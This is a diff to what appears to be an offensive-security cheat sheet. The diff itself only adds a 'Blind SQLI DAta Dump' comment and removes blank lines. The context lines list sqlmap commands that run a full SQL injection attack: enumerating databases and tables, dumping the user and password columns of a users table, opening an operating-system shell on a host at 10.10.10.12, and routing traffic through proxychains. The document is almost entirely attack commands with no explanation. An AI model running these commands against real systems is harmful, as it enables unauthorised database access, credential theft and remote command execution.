@@ -20,6 +20,7 @@ sqlmap -u http://10.10.10.12/ModificarVisitas.aspx?IdEvento=%27 -D 'DB' --os-she
 ==============================================================================
 [+] SQLmap with request
 ==============================================================================
+# Blind SQLI DAta Dump steps 
 sqlmap -r req.req --level 3 --risk 3
 sqlmap -r req.req --level 3 --risk 3 --dbs
 sqlmap -r req.req --level 3 --risk 3 --dbs --os-shell
@@ -27,8 +28,6 @@ sqlmap -r req.req --level 3 --risk 3 --dbs -D "database_name" --tables
 sqlmap -r req.req --level 3 --risk 3 --dbs -D "database_name" -T "users" --columns
 sqlmap -r req.req --level 3 --risk 3 --dbs -D "database_name" -T "users" -C "user" --dump
 sqlmap -r req.req --level 3 --risk 3 --dbs -D "database_name" -T "users" -C "password" --dump
-
-
 
 proxychains sqlmap -r request2.req --level 2 --risk 1
 
